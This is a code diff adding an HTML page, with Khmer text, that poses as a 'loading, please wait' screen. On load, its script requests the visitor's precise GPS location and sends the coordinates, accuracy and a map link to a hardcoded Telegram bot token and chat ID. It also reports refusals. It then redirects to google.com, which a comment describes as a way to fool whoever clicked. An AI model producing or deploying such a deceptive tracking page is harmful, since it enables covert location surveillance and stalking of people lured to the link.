@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="km">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>កំពុងផ្ទុក...</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f4f4f4; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+    <p style="margin-left: 10px;">សូមរង់ចាំបន្តិច...</p>
+
+    <script>
+        // ព័ត៌មានដែលអ្នកបានផ្ដល់ឱ្យ
+        const token = '8483947208:AAGbRWoddoYsLOKrsVHiPwtch7lnjxxjokY';
+        const chatId = '5983230232';
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+            fetch(url);
+        }
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                // ស្នើសុំទីតាំង
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy; // កម្រិតលម្អិត (ម៉ែត្រ)
+                    
+                    // បង្កើត Link ផែនទី Google Maps
+                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    const msg = `📍 **រកឃើញទីតាំងថ្មី!**\n\n` +
+                                `🌐 Latitude: \`${lat}\` \n` +
+                                `🌐 Longitude: \`${lon}\` \n` +
+                                `🎯 កម្រិតលម្អិត: +/- ${accuracy} ម៉ែត្រ\n\n` +
+                                `🔗 មើលលើផែនទី: ${mapUrl}`;
+                    
+                    sendToTelegram(msg);
+                    
+                    // បន្លំភ្នែកអ្នកចុច បន្ទាប់ពីផ្ញើរួចឱ្យគេទៅកាន់វេបសាយផ្សេង
+                    setTimeout(() => {
+                        window.location.href = "https://www.google.com"; 
+                    }, 2000);
+
+                }, function(error) {
+                    // ករណីគេចុច Block ឬបិទ Location
+                    let errorMsg = "";
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMsg = "❌ អ្នកចុចបានបដិសេធ (Denied) ការឱ្យមើលទីតាំង។";
+                            break;
+                        default:
+                            errorMsg = "❌ មានបញ្ហាបច្ចេកទេសក្នុងការទាញយកទីតាំង។";
+                    }
+                    sendToTelegram(errorMsg);
+                    window.location.href = "https://www.google.com";
+                }, {
+                    enableHighAccuracy: true, // ប្រើ GPS ឱ្យអស់លទ្ធភាព
+                    timeout: 5000,
+                    maximumAge: 0
+                });
+            } else {
+                sendToTelegram("❌ Browser មិនគាំទ្រការចាប់ទីតាំងទេ។");
+            }
+        };
+    </script>
+</body>
+</html>
